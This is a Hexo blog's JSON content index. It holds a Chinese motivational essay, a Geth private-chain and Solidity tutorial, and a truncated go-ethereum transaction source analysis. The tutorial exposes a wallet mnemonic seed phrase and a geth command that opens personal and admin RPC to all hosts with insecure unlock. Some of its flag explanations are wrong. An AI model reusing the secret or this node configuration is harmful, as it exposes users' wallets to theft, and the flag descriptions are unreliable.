{"meta":{"title":"Syraer's Blog","subtitle":"您好。世界！","description":"一枚小菜鸡~","author":"Syraer","url":"http://www.zzugo.ayxyj.cn","root":"/"},"pages":[{"title":"tags","date":"2020-11-08T07:44:59.000Z","updated":"2020-11-08T07:47:15.261Z","comments":true,"path":"tags/index.html","permalink":"http://www.zzugo.ayxyj.cn/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-11-08T07:56:08.000Z","updated":"2020-11-08T12:15:36.430Z","comments":true,"path":"friends/index.html","permalink":"http://www.zzugo.ayxyj.cn/friends/index.html","excerpt":"","text":""},{"title":"gallerys","date":"2020-11-08T12:13:21.482Z","updated":"2020-11-08T12:13:21.481Z","comments":true,"path":"gallerys/index.html","permalink":"http://www.zzugo.ayxyj.cn/gallerys/index.html","excerpt":"","text":"ablums:[ [“https://s1.ax1x.com/2020/11/08/BosrNj.jpg&quot;,&quot;test1&quot;], [“https://s1.ax1x.com/2020/11/08/BosfDU.jpg&quot;,&quot;test2&quot;], [“https://s1.ax1x.com/2020/11/08/Bos5E4.jpg&quot;,&quot;test3&quot;]]"},{"title":"categories","date":"2020-11-08T07:43:09.000Z","updated":"2020-11-08T07:44:19.916Z","comments":true,"path":"categories/index.html","permalink":"http://www.zzugo.ayxyj.cn/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Snobbery is the way of the world","slug":"Personal01","date":"2020-12-15T11:44:59.000Z","updated":"2020-12-15T11:44:19.000Z","comments":true,"path":"2020/12/15/Personal01/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/12/15/Personal01/","excerpt":"","text":"“ Snobbery is the way of the world – people are friendly or unfriendly,depending on whether one is successful or not.”“世态炎凉（势利是这个世间的方式）——人们对你是否有善,取决于你是否成功.” 天一亮，太阳照常升起，生活还得继续，无论如何，只要不妨碍着谁，想吃吃，想睡睡，想不说话就不说话，不必太在意别人，只要自己舒心就行了。 人，都难免会遇到逆境的时候。人在逆境的时候，我们的经济条件，我们的人脉资源，我们的物质基础，都会变得十分地薄弱。所以，在这一样的一种境遇下，我们难免会在自己的人生路上，遇到种种困难。曾经经受过许多挫折和困难的古人或者前人，给身处逆境的人留下不少扎心的人生金句，特别是这四句话，更是让我们感到人生的不容易。而在逆境中，能够咬牙挺过来的人，却往往会成为一个与众不同的人。 第一句金句：人穷休入众，位卑莫劝人。在民间，有很多耳熟能详的俗语，却道尽了人际交往的微妙性，比如这句“人穷休入众，位卑莫劝人。”这句话的意思其实也很浅显，其实就是告诉我们，一个人在落魄的时候，不要随意进入很多人的圈子里，免得被人讥讽嘲笑；在自己地位暂时比较卑微底层的时候，遇到他人之间的矛盾等杂事纠纷，我们尽量不要去参与劝解，免得被人嫌弃，甚至攻击。这样的境遇，一般人很难遇到，只有一个人真正遇到困境的时候，在自己身处逆境的时候，才会真正深刻地体会到这些人情世故。有时候，我们很愤怒，却往往无可奈何，只能低下头来，转身离去，然后，靠着自己默默地努力，去改变现状，才是最好的办法。 第二句金句：穷在闹市无人问，富在深山有远亲。人在逆境的时候，特别是当一个人从自己曾经辉煌的事业，跌入人生的低谷的时候，我们才会真正地领悟到“穷在闹市无人问，富在深山有远亲”的滋味。是啊，一个人，在富有的时候，往往身边车水马龙，很多人，都想和我们来往；而当我们陷入经济危机，甚至落魄落难的时候，曾经的亲人朋友，也许，都会一个个远离我们而去。而越是这样，我们越要明白，在自己陷入落魄的境地，靠山靠人，都不可靠，只有靠自己咬牙坚持，才能让自己慢慢强大，才能让自己活出新的自我。 第三句金句：虎落平阳被犬欺，凤凰落水不如鸡。“虎落平阳被犬欺，凤凰落水不如鸡。”这句话的意思，就是说以前的身份地位不在了，自己落魄了，所以，失去了曾经的强势力量，现在，会很容易被被很弱的人欺负。当然，这只是一个比喻，其实，这句话更是告诉我们，一个人陷入落魄境地的时候，当我们一个人背井离乡独自闯荡的时候，身在异乡，我们会遇到很多想不到的困境。身边没有亲人和朋友的帮助，自己孤家寡人，力量单薄，非常容易遭遇不如意的待遇，被人欺负，看不起的事情，也会常常发生。而越是在这样的境遇中，我们越要懂得隐忍自己，用自己一颗强大的心脏，去撑起人在异乡的困难，慢慢地挺过自己的人生的冬季，才能实现自己新的理想和追求。 第四句金句：钱不是万能的，没有钱是万万不能的。人活着，在我们凡俗的日子里，如果没有遭遇什么经济危机，我们是不会深刻领悟到没有钱的痛苦滋味的。而只有当我们陷入人生的低谷，身处逆境，身无分文，甚至欠债累累的时候，我们才能深刻地领悟到“钱不是万能的，没有钱是万万不能的”心酸和无奈。是啊，古人云：一文钱难倒英雄汉。 一个人，只有陷入落魄的逆境中，被自己基本的衣食住行困扰的时候，我们内心才能为没有一定的经济基础而忧心忡忡。所以，身处逆境，我们一定要想办法先找到工作，解决好自己的衣食住行，然后，靠着自己的咬牙坚持，才能慢慢地挺过自己最为艰难的时期。 朋友们，一个人身处逆境，其实，还不是什么大的问题。只要我们没有自暴自弃，只要我们懂得咬牙去慢慢地坚持熬下去，总有一天，我们会走出困境，迎来属于我们的春暖花开满地鲜花的盛景。而人生的这些金句，会让我们走出人生冬季的时候，成为我们的座右铭，常常闪耀在我们的脑海里，激励我们，谨慎而顽强地前行。","categories":[{"name":"Personal","slug":"Personal","permalink":"http://www.zzugo.ayxyj.cn/categories/Personal/"}],"tags":[{"name":"Personal","slug":"Personal","permalink":"http://www.zzugo.ayxyj.cn/tags/Personal/"}]},{"title":"Geth_搭建私有链","slug":"Geth_note","date":"2020-11-29T10:32:14.000Z","updated":"2020-11-29T10:52:42.921Z","comments":true,"path":"2020/11/29/Geth_note/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/29/Geth_note/","excerpt":"","text":"MetaMask_pass:spot raccoon network sweet feel song knee put just uncover news audit //我的MetaMask助记词 ；可以直接用Remix-IDE连接geth，也可以通过MetaMask连接Geth，这样MetaMask帮助你实现r s v ，不用自己去弄！ Geth客户端：Geth_download Part0 MetaMask 12#通过MetaMask连接本地Geth或者Ganache搭建的私有链或者TestRPC等都可以，这样会比较方便查看部署的合约和交易信息，而且更贴合实际操作。#如果不想搭建私有链，可以通过测试网络去部署合约和交易也是可以的，但是首先需要从对应的测试网络水龙头获取ether操作及之后测试需要科学上网。 在本地通过npm安装一个remixd，这样可以实时将本地和浏览器代码同步，方便存储代码。npm install remixd -g 部署合约和测试合约 123456789101112131415161718192021222324#智能合约#Solidity编译器是solc，通过remix-ide编写合约时候，注意solc的版本 #pragma solidity &gt;0.6.2 也可以，当版本出现错误时候，可以尝试改变编译版本pragma solidity ^0.6.2;contract Test&#123; //contract balance uint public money ; //在remix中修改value 运行paly，金额就转到合约当中去了，然后通过transfer转到其他账户中去 function paly() public payable&#123; money = msg.value; &#125; //contract balance function getBalance() public view returns(uint256)&#123; return address(this).balance; &#125; address payable addr = 0x78662A9CFfFc852cF61a5c6c637cFB93f1c59397; //transfer who ,who call function transfer(uint i ) public payable &#123; addr.transfer ( i * 10 ** 18); &#125;&#125; 接种编写合约的方式 VS code IDE,代码编写,基本的语法检查. Remix IDE,简单代码编译运行看结果.方便学习. Truffle 环境,生产环境,较为复杂的代码编译部署. ENVIRONMENT JavaScriptVM 该方式环境是将合约部署到浏览器的Solidity编译环境，可以在内存中模拟合约,直接运行,而不需要部署等复杂流程,适合入门学习. Injected Web3 该方式可以连接到MetaMask. Web3 Provider 该方式通过本地私有网络的rpc端口,链接到本地私有网络进行调试. Deployed Contracts 可以看到已经部署的合约，此时就可以看到在合约中写的相应get-set函数和public的状态变量; 可以进行智能合约回调，当且只有产生新的数据才会发生交易，否则仅仅是调用，而不会产生新的交易区块. Part1 Geth入门 创世块 1234567891011&#123; &quot;config&quot;: &#123; &quot;chainId&quot;: 15 &#125;, &quot;difficulty&quot;: &quot;2000&quot;, &quot;gasLimit&quot;: &quot;2100000&quot;, &quot;alloc&quot;: &#123; &quot;7df9a875a174b3bc565e6424a0050ebc1b2d1d82&quot;: &#123; &quot;balance&quot;: &quot;300000000000000000000&quot; &#125;, &quot;f41c74c9ae680c1aa78f42e5647a62f353b7bdde&quot;: &#123; &quot;balance&quot;: &quot;400000000000000000000&quot; &#125; &#125;&#125; 初始化创世快 123D:\\gethData&gt;geth --datadir . init genesis.json 此时在testGeth目录下会生成data目录，data目录又包含geth和keystore目录，geth目录存储区块数据，keystore目录则保存账户信息。 --init #根据genesis.json文件初始化创世区块 启动geth并开启远程RPC然后log输出到output.log里面 1234567891011121314151617181920212223D:\\gethData&gt;geth --datadir ./data0/ --rpc --rpccorsdomain &quot;*&quot; --rpcaddr &quot;0.0.0.0&quot; --rpcapi &quot;personal,admin,miner,db,eth,net,web3&quot; --ipcdisable --nodiscover --allow-insecure-unlock --networkid 15 console 2&gt;&gt; output.logD:\\gethData&gt;geth --datadir &quot;./data0/&quot; --nodiscover --ipcdisable --port 3333 --rpc --rpcport 4444 --rpcapi=&quot;db,eth,net,web3,personal&quot; --allow-insecure-unlock --rpccorsdomain=&quot;http://remix.ethereum.org&quot; --networkid 1314 console 2&gt;output.log --datadir #指定数据存储位置（也是默认的私钥仓库位置keystore） --networkid 123#参数表示区块链网络ID标识， --console #参数表示进入geth控制台。 --rpc #启动HTTP-RPC服务（基于HTTP的） --rpcapi #远程可调用的功能，默认web3,net,eth。4.24版本必须添加personal，否则remix无法读取本地账户列表；4.24版本testrpc也是无法读取用户列表。 --rpccorsdomain #指定一个可以接收请求来源的以逗号间隔的域名列表（浏览器访问的话，要强制指定该选项） --rpcaddr # HTTP-RPC服务器监听地址(default: &quot;localhost&quot;) --rpcport &quot;8545&quot; #设置geth的端口号，默认为8545 --port &quot;30303&quot; #设置监听端口号，用于与其他按节点进行连接，默认30303 --identity &quot;TestNetMainNode&quot; #设置节点标识 --ipcdiscover #关闭进程间通信 --maxpeers 0 #设置网络中可以被接入的最大节点数目，0代表不被其他节点接入 --nodiscover #私有链,不被别人添加 --allow-insecure-unlock #禁止了HTTP通道解锁账户 --2&gt;&gt; output.log #错误追加输出到output.log(所有信息不管错误和正确都输出到文件中) #连接测试网进入控制台，此时我们已经进入geth测试网的交互式控制台，窗口也显示「Welcome to the Geth JavaScript console」成功提示！#注意： #https://blog.csdn.net/qq_32938169 #某位大佬博客#在当前目录下运行 geth，就会启动这条私链，注意要将 networked 设置为与创世块配置里的chainId 一致。#异常：使用最新版本geth客户，当执行personal.unlockAccount()或在程序中调用personal_unlockAccount接口时，会出现：account unlock with HTTP access is forbidden异常。#异常原因：新版本geth，出于安全考虑，默认禁止了HTTP通道解锁账户，相关issue：https://github.com/ethereum/go-ethereum/pull/17037 发送一比交易： 1personal.sendTransaction(&#123;from: &quot;0xaC58C330aC8fF04fF828684d3FFABEFE987de7cb&quot; , to: eth.accounts[0] , value: web3.toWei(100 , &quot;ether&quot;)&#125;) 查询账户余额且以ether方式显示 1web3.fromWei(eth.getBalance(&quot;0xaC58C330aC8fF04fF828684d3FFABEFE987de7cb&quot;)，,&#x27;ether&#x27;) 查询账户列表 123eth.accounts #数组 - 输出结果：[] - 含义：意思是无账户地址，因为我们什么也没做，所以当然是不会凭空出现账户了。 创建新账户 123personal.newAccount(&quot;password&quot;)# 输出结果：hash# 含义：表明账户新建成功，返回账户地址，123为账户密码。此时我们再次查询账户列表会发现已有刚创建的地址了。 查询账户余额 123eth.getBalance(eth.accounts[0])# 输出结果：0# 含义：表明这个账户的余额是0。 启动或停止挖矿 123miner.start();#开始挖矿admin.sleepBlocks(1);miner.stop() 以Ether显示余额 1web3.fromWei(eth.getBalance(eth.accounts[0]),&quot;ether&quot;)#查询余额 常见对象 12345678Geth Console 是一个交互式的 JavaScript 执行环境，里面内置了一些用来操作以太坊的 JavaScript 对象，我们可以直接调用这些对象来获取区块链上的相关信息。这些对象主要包括： eth#主要包含对区块链进行访问和交互相关的方法； net#主要包含查看 p2p 网络状态的方法； admin#主要包含与管理节点相关的方法； miner# 主要包含挖矿相关的一些方法； personal#包含账户管理的方法； txpool#包含查看交易内存池的方法； web3#包含以上所有对象，还包含一些通用方法。 常用命令 1234567891011121314151617181920212223242526272829#分类展示常见命令：Personal: personal.newAccount(&quot;password&quot;)#创建账户； personal.unlockAccount(eth.accounts[0])#解锁账户0； personal.unlockAccount(eth.coinbase)#解锁当前挖矿的账户 personal.sendTransaction() #发送交易；参数：from to value Eth: eth.accounts #数组；列出系统中的账户； eth.getBalance()#查看账户余额，返回值的单位是 Wei； eth.blockNumber#列出当前区块高度； eth.getTransaction()#获取交易信息； eth.getBlock()#获取区块信息； eth.estimateGas(&#123;data: code&#125;)#估计部署合约要用的gas eth.sendTransaction(&#123;from:eth.accounts[0],to:eth.accounts[1],value:web3.toWei(2)&#125;)#交易 //部署合约 var code =&quot;合约bytecode&quot;; var abi = &quot;合约ABI&quot;; var myContract = eth.contract(abi) #创建类，合约的ABI myContract.new(&#123;from:eth.accounts[0] , data:code , gas:210000&#125;)#创建合约实例Miner: miner.start()#开始挖矿；默认线程12 miner.stop()#停止挖矿； miner.setEtherbase(eth.accounts[0])#设置挖矿人Web3: web3.fromWei()# Wei 换算成以太币； web3.fromWei(eth.getBalance(eth.accounts[0]),&#x27;ether&#x27;)#以ether方式查看余额 web3.toWei()#以太币换算成 Wei；Txpool: txpool.status#交易池中的状态； 既然是javaScript的执行环境，肯定可以定义一些变量等其他 12#定义变量var variablename = value; Part2 部署智能合约 在Remix-IDE中，可可以在编译界面看到 Compilation Details 打开可以看到ABI（Json还要进行压缩转移麻烦）和ByteCode（也可以直接支付下方的） 更重要的是，可以直接复制WEB3DEPLOY的给定的JavaScript脚本直接粘贴到Geth即可，方便快捷 惭愧：上面两种方式我都失败了，懒得弄了，后续有需求在搞，网上教程找个很多，都是这样操作的，但是我就是不成功，最后乖乖的直接部署到Ganache/TestRPC。 IPFS，星际文件系统（分布式文件系统，去中心化，底层区块链）内容很多，功能很强大.Download科学上网去下，或者Git 我目前知道的好处：比如，互联网中常见的html网页，很多都是重复的内容，但是存储多份；此时如果通过IPFS进行存储，由于IPFS是基于内容寻址的，所以只要内容一样，解析的地址是同一个 其次就是，IPDS也可以解决记录多版本问题 定义变量存储合约信息 12var code =&quot;合约bytecode&quot;;var abi = &quot;合约ABI&quot;; 估算部署合约要用的gas 1eth.estimateGas(&#123;data: code&#125;) 部署合约 1234var myContract = eth.contract(abi)//创建类var contract1 =myContract.new(&#123;from:&quot;0xe473d288faf6c2d1812dbb759d7423605c7d1a58&quot;,data:code,gas:1200000&#125;)//创建合约实例。括号内部的from后填写的是你账户的地址。gas后填写你愿意支付的gas。原则上大于刚刚估计的值。 查看合约信息 12345678910contract1 txpool.status//这个命令可以看到有没有待挖矿的交易。我们可以看到有一个。miner.start()miner.stop()//挖一会矿再停下来。txpool.status//待挖矿交易变为0。就说明合约已经写入链上了。contract1.address//调用这个可以看到我们部署到链上的合约的地址了。这个值保存下来。以后要用到。 至此合约已经部署到了我们搭建的私链上了。 如何调用已经部署好的合约 123# 重新启动Geth控制台或者使用其他包时，调用原来部署好的智能合约要通过合约地址。# 没有写入链上的变量在经历重启geth或者重启web3程序时都会没有了。但是如果部署好的智能合约，并且写入数据时运用的交易都挖矿写入链中了。那么再次通过地址调用时关于合约的数据就都还保留。# 下面示例在Geth中调用合约的方法。假设我们现在已经重启了Geth控制台，首先还是要用合约地址实例化一个合约出来。 123456var abi=JSON.parse(‘合约的abi’)//录入ABI。格式同上一节myContract = eth.contract(abi)//创建类contract = myContract.at(address)//创建合约实例，这里要指名部署过的合约地址。地址先前已经保存。 通过geth控制台调用智能合约中的函数智能合约中的函数分为两类，一种是需要付gas才能调用的函数，一种是无需花费gas的函数。这两类函数在geth控制台中被调用时用到的命令不一样，这里分别举两个例子。 123456personal.unlockAccount(eth.coinbase)//记得先解锁账户contract.函数名.sendTransaction(&quot;参数1&quot;,&quot;参数2&quot;,&quot;参数...&quot;,&#123;from:&quot;0xe473d288faf6c2d1812dbb759d7423605c7d1a58&quot;&#125;)//上面是在geth控制台调用transactionn类型（要付gas类的）函数的方法。函数名要替换成自己的，括号内部前部分为函数的参数，分别列出，最后一项大括号内from要写付费的用户的地址（换成自己的）。contract.函数名.call(&quot;参数1&quot;,&quot;参数2&quot;, &quot;参数...&quot;)//调用call类型函数的方法，（不要付gas类的）。 所有函数： 123456789101112131415161718192021222324252627282930313233&gt; eth.eth._requestManager eth.getBlockTransactionCount eth.getUncleeth.accounts eth.getBlockUncleCount eth.getWorketh.blockNumber eth.getCode eth.hashrateeth.call eth.getCoinbase eth.ibaneth.chainId eth.getCompilers eth.icapNameregeth.coinbase eth.getGasPrice eth.isSyncingeth.compile eth.getHashrate eth.miningeth.constructor eth.getHeaderByHash eth.nameregeth.contract eth.getHeaderByNumber eth.pendingTransactionseth.defaultAccount eth.getMining eth.protocolVersioneth.defaultBlock eth.getPendingTransactions eth.resendeth.estimateGas eth.getProof eth.sendIBANTransactioneth.fillTransaction eth.getProtocolVersion eth.sendRawTransactioneth.filter eth.getRawTransaction eth.sendTransactioneth.gasPrice eth.getRawTransactionFromBlock eth.signeth.getAccounts eth.getStorageAt eth.signTransactioneth.getBalance eth.getSyncing eth.submitTransactioneth.getBlock eth.getTransaction eth.submitWorketh.getBlockByHash eth.getTransactionCount eth.syncingeth.getBlockByNumber eth.getTransactionFromBlocketh.getBlockNumber eth.getTransactionReceipt&gt; personal.personal._requestManager personal.getListWallets personal.lockAccount personal.signTransactionpersonal.constructor personal.importRawKey personal.newAccount personal.unlockAccountpersonal.deriveAccount personal.initializeWallet personal.openWallet personal.unpairpersonal.ecRecover personal.listAccounts personal.sendTransactionpersonal.getListAccounts personal.listWallets personal.sign&gt; miner.miner.constructor miner.propertyIsEnumerable miner.setRecommitInterval miner.toStringminer.getHashrate miner.setEtherbase miner.start miner.valueOfminer.hasOwnProperty miner.setExtra miner.stopminer.isPrototypeOf miner.setGasPrice miner.toLocaleString Part3 本地环境信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177&gt; admin &#123; datadir: &quot;D:\\\\gethData&quot;, nodeInfo: &#123; enode: &quot;enode://fac072814049255eb2f4c8c2c381183d87ee519d93600852cdcabd7dc3d9224d916be319bb2bfed89430112225f338d9dc15ea818f89cd242e46a05dd6bd63a7@192.168.136.117:30303&quot;, enr: &quot;enr:-Je4QFYrz1dcrKYsGSKlFZARRs4T6pki558pyHzIb1294oLWfgVCCLANovQUjqPjxi7jqfHjS_Elg3BI97K7JyFtbVACg2V0aMfGhMmaRmeAgmlkgnY0gmlwhMCoiHWJc2VjcDI1NmsxoQP6wHKBQEklXrL0yMLDgRg9h-5RnZNgCFLNyr19w9kiTYN0Y3CCdl-DdWRwgnZf&quot;, id: &quot;8a2d0a9309f63565292f84e6286532af5abc27df6abfb93f49c0d2d077b9666d&quot;, ip: &quot;192.168.136.117&quot;, listenAddr: &quot;[::]:30303&quot;, name: &quot;Geth/v1.9.23-stable-8c2f2715/windows-amd64/go1.15&quot;, ports: &#123; discovery: 30303, listener: 30303 &#125;, protocols: &#123; eth: &#123; config: &#123;...&#125;, difficulty: 2000, genesis: &quot;0xdc9866ac4601761e6b960e690eb144c03dd48e7125c99e14ecf0a0af5d739224&quot;, head: &quot;0xdc9866ac4601761e6b960e690eb144c03dd48e7125c99e14ecf0a0af5d739224&quot;, network: 16 &#125; &#125; &#125;, peers: [&#123; caps: [&quot;eth/63&quot;], enode: &quot;enode://8192f9e5cfa8fb73e914c39e830211ab2b98d6180df1cf009c1b1c9ddad3bb6d09d986db5ee125f4bb59c226014e72975f170c734774cc389ccb6e6f73fcce34@174.138.19.97:1234&quot;, id: &quot;f227374bcd5f39fff43a333f04cbe43393f5db0baf5eb4ebddd9c8a9ae6fdfbe&quot;, name: &quot;Geth/v1.0.0-stable-7e368c8e/linux-amd64/go1.12.10&quot;, network: &#123; inbound: false, localAddress: &quot;192.168.1.118:50638&quot;, remoteAddress: &quot;174.138.19.97:1234&quot;, static: false, trusted: false &#125;, protocols: &#123; eth: &quot;handshake&quot; &#125; &#125;, &#123; caps: [&quot;eth/63&quot;, &quot;eth/64&quot;, &quot;eth/65&quot;], enode: &quot;enode://5928e6c7a1b9c90014b5b5ef5fbd305636b477f2e35b5c608ed7fae82e0ea3295be2c716ec50de640e5b0665c44f652cde5c9f3a6e4bcf134657a6944cd91d39@149.5.29.162:30303&quot;, id: &quot;f24d4969e9e4f171b36d962f15ea1bc25b037731a99eee25887b02d1437d09ac&quot;, name: &quot;Pirl/v1.9.12-v7-masternode-premium-lion-ea07aebf-20200407/linux-amd64/go1.13.6&quot;, network: &#123; inbound: false, localAddress: &quot;192.168.1.118:50661&quot;, remoteAddress: &quot;149.5.29.162:30303&quot;, static: false, trusted: false &#125;, protocols: &#123; eth: &quot;handshake&quot; &#125; &#125;], addPeer: function(), addTrustedPeer: function(), clearHistory: function(), exportChain: function(), getDatadir: function(callback), getNodeInfo: function(callback), getPeers: function(callback), importChain: function(), removePeer: function(), removeTrustedPeer: function(), sleep: function(), sleepBlocks: function(), startRPC: function(), startWS: function(), stopRPC: function(), stopWS: function() &#125;personal &gt; personal &#123; listAccounts: [&quot;0xc59256c9f92d19e877d4a9931652ccbcd1260076&quot;], listWallets: [&#123; accounts: [&#123;...&#125;], status: &quot;Locked&quot;, url: &quot;keystore://D:\\\\gethData\\\\keystore\\\\UTC--2020-11-10T00-51-59.108912200Z--c59256c9f92d19e877d4a9931652ccbcd1260076&quot; &#125;], deriveAccount: function(), ecRecover: function(), getListAccounts: function(callback), getListWallets: function(callback), importRawKey: function(), initializeWallet: function(), lockAccount: function(), newAccount: function(), openWallet: function(), sendTransaction: function(), sign: function(), signTransaction: function(), unlockAccount: function(), unpair: function() &#125;miner &gt; miner &#123; getHashrate: function(), setEtherbase: function(), setExtra: function(), setGasPrice: function(), setRecommitInterval: function(), start: function(), stop: function() &#125;eth &gt; eth &#123; accounts: [&quot;0xc59256c9f92d19e877d4a9931652ccbcd1260076&quot;], blockNumber: 0, coinbase: &quot;0xc59256c9f92d19e877d4a9931652ccbcd1260076&quot;, compile: &#123; lll: function(), serpent: function(), solidity: function() &#125;, defaultAccount: undefined, defaultBlock: &quot;latest&quot;, gasPrice: 1000000000, hashrate: 0, mining: false, pendingTransactions: [], protocolVersion: &quot;0x41&quot;, syncing: false, call: function(), chainId: function(), contract: function(abi), estimateGas: function(), fillTransaction: function(), filter: function(options, callback, filterCreationErrorCallback), getAccounts: function(callback), getBalance: function(), getBlock: function(), getBlockByHash: function(), getBlockByNumber: function(), getBlockNumber: function(callback), getBlockTransactionCount: function(), getBlockUncleCount: function(), getCode: function(), getCoinbase: function(callback), getCompilers: function(), getGasPrice: function(callback), getHashrate: function(callback), getHeaderByHash: function(), getHeaderByNumber: function(), getMining: function(callback), getPendingTransactions: function(callback), getProof: function(), getProtocolVersion: function(callback), getRawTransaction: function(), getRawTransactionFromBlock: function(), getStorageAt: function(), getSyncing: function(callback), getTransaction: function(), getTransactionCount: function(), getTransactionFromBlock: function(), getTransactionReceipt: function(), getUncle: function(), getWork: function(), iban: function(iban), icapNamereg: function(), isSyncing: function(callback), namereg: function(), resend: function(), sendIBANTransaction: function(), sendRawTransaction: function(), sendTransaction: function(), sign: function(), signTransaction: function(), submitTransaction: function(), submitWork: function() &#125;","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/"},{"name":"Geth","slug":"BlockChain/Geth","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Geth/"},{"name":"MetaMask","slug":"BlockChain/Geth/MetaMask","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/Geth/MetaMask/"}],"tags":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/tags/BlockChain/"},{"name":"Geth","slug":"Geth","permalink":"http://www.zzugo.ayxyj.cn/tags/Geth/"},{"name":"MetaMask","slug":"MetaMask","permalink":"http://www.zzugo.ayxyj.cn/tags/MetaMask/"}]},{"title":"以太坊源码分析 - 交易源码分析","slug":"EVM_Source","date":"2020-11-29T09:22:14.000Z","updated":"2020-11-29T10:52:58.315Z","comments":true,"path":"2020/11/29/EVM_Source/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/29/EVM_Source/","excerpt":"","text":"目录 一 . 发起交易 1. 发送交易时参数的机构体对象 2. SendTransaction（）方法介绍 2.1. toTransaction（）方法 2.2. 调用wallet.SignTx(account, tx, chainID)对当前交易进行签名。 2.2.1 调用types.SignTx方法进行签名 2.2.2 调用WithSignature为交易设置签名 2.2.3 调用SignatureValues方法获取r,s,v字段 2.3 调用submitTransaction提交交易 二. 节点接收交易 1. 执行add方法将交易添加到交易池中 2. 调用validateTx验证交易 3. 调用pool.enqueueTx(hash, tx)，将交易添加到待执行的交易队列中 3.1 调用queue的add方法替换交易 4. 调用promoteExecutables方法将交易插入到pending执行队列中 4.1 调用promoteTx将交易广播到其他节点 以太坊的交易的生命周期主要包括以下几部分： \\1. 用户发送交易 \\2. 节点接收交易 \\3. 执行交易 \\4. 打包区块 \\5. 矿工节点挖矿 \\6. 区块广播，交易保存到链上 在当前博文里面主要包含，用户如何发起交易、以及交易的签名、交易发送到交易池中、交易池广播交易等 一 . 发起交易​ 用户通过grpc接口调用go-ethereum\\internal\\ethapi 里面 PublicTransactionPoolAPI结构体里面的SendTransaction的方法发送交易，在该方法内部根据发送的地址获取当前用户的钱包信息，然后对生成交易对象，利用私钥对交易签名，最后提交交易。下面是对该方法的具体介绍 1. 发送交易时参数的机构体对象 参数 ctx：上下文信息 args:发送交易时的参数包含值（from，To,Gas,Gasprice,Value,Nonce,Data,Input） 12345678910111213//发送交易信息的结构体type SendTxArgs struct &#123; From common.Address `json:&quot;from&quot;` //发送人 To *common.Address `json:&quot;to&quot;` //接收地址 Gas *hexutil.Uint64 `json:&quot;gas&quot;` //gas GasPrice *hexutil.Big `json:&quot;gasPrice&quot;` //gasprice Value *hexutil.Big `json:&quot;value&quot;` //交易的值 Nonce *hexutil.Uint64 `json:&quot;nonce&quot;` //交易的nonce // We accept &quot;data&quot; and &quot;input&quot; for backwards-compatibility reasons. &quot;input&quot; is the // newer name and should be preferred by clients. Data *hexutil.Bytes `json:&quot;data&quot;` Input *hexutil.Bytes `json:&quot;input&quot;`&#125; 2. SendTransaction（）方法介绍执行步骤 2.1 根据from参数获取账号 2.2 调用args.toTranscation方法生产交易tx对象 2.3 调用wallet.SignTx方法对当前交易进行签名 2.4 调用submitTransaction(ctx,s.b,signed)函数提交当前的交易 123456789101112131415161718192021222324252627282930func (s *PublicTransactionPoolAPI) SendTransaction(ctx context.Context, args SendTxArgs) (common.Hash, error) &#123; account := accounts.Account&#123;Address: args.From&#125; wallet, err := s.b.AccountManager().Find(account) if err != nil &#123; return common.Hash&#123;&#125;, err &#125; if args.Nonce == nil &#123; // Hold the addresse&#x27;s mutex around signing to prevent concurrent assignment of // the same nonce to multiple accounts. s.nonceLock.LockAddr(args.From) defer s.nonceLock.UnlockAddr(args.From) &#125; if err := args.setDefaults(ctx, s.b); err != nil &#123; return common.Hash&#123;&#125;, err &#125; //将当前的交易信息生成交易信息 tx := args.toTransaction() var chainID *big.Int //获取当前区块链的ID if config := s.b.ChainConfig(); config.IsEIP155(s.b.CurrentBlock().Number()) &#123; chainID = config.ChainID &#125; //对当前的交易进行签名 signed, err := wallet.SignTx(account, tx, chainID) if err != nil &#123; return common.Hash&#123;&#125;, err &#125; return submitTransaction(ctx, s.b, signed)&#125; 2.1. toTransaction（）方法交易的结构体 12345678910111213141516171819202122232425/**以太坊交易的结构体*/type Transaction struct &#123; data txdata //交易的数据 // caches hash atomic.Value size atomic.Value from atomic.Value&#125;type txdata struct &#123; AccountNonce uint64 `json:&quot;nonce&quot; gencodec:&quot;required&quot;` //发送者发送交易数的计数 Price *big.Int `json:&quot;gasPrice&quot; gencodec:&quot;required&quot;` //发送者愿意支付执行交易所需的每个gas的Wei数量 GasLimit uint64 `json:&quot;gas&quot; gencodec:&quot;required&quot;` //发送者愿意为执行交易支付gas数量的最大值。这个数量被设置之后在任何计算完成之前就会被提前扣掉 Recipient *common.Address `json:&quot;to&quot; rlp:&quot;nil&quot;` // nil means contract creation 所使用的接收人的地址，如果为空的话，这说明是使用合约地址 Amount *big.Int `json:&quot;value&quot; gencodec:&quot;required&quot;` // 从发送者转移到接收者的Wei数量。在合约创建交易中，value作为新建合约账户的开始余额 Payload []byte `json:&quot;input&quot; gencodec:&quot;required&quot;` //在调用合约函数时input中保存的是合约函数的名称及参数，在部署合约时input中保持的是合约的abi,data及合约构造函数的参数 // Signature values V *big.Int `json:&quot;v&quot; gencodec:&quot;required&quot;` //用于标识交易时产生的签名 R *big.Int `json:&quot;r&quot; gencodec:&quot;required&quot;` //用于标识交易时产生的签名 S *big.Int `json:&quot;s&quot; gencodec:&quot;required&quot;` //用于标识交易时产生的签名 // This is only used when marshaling to JSON. Hash *common.Hash `json:&quot;hash&quot; rlp:&quot;-&quot;` //当前交易的hash &#125; 根据输入的参数生成Transaction对象，根据输入参数里面的to字段判端，如果to字段为空的话，则为合约交易，否则为正常交易 123456789101112131415/**利用发送的信息生成新的交易*/func (args *SendTxArgs) toTransaction() *types.Transaction &#123; var input []byte if args.Data != nil &#123; input = *args.Data &#125; else if args.Input != nil &#123; input = *args.Input &#125; if args.To == nil &#123; return types.NewContractCreation(uint64(*args.Nonce), (*big.Int)(args.Value), uint64(*args.Gas), (*big.Int)(args.GasPrice), input) &#125; return types.NewTransaction(uint64(*args.Nonce), *args.To, (*big.Int)(args.Value), 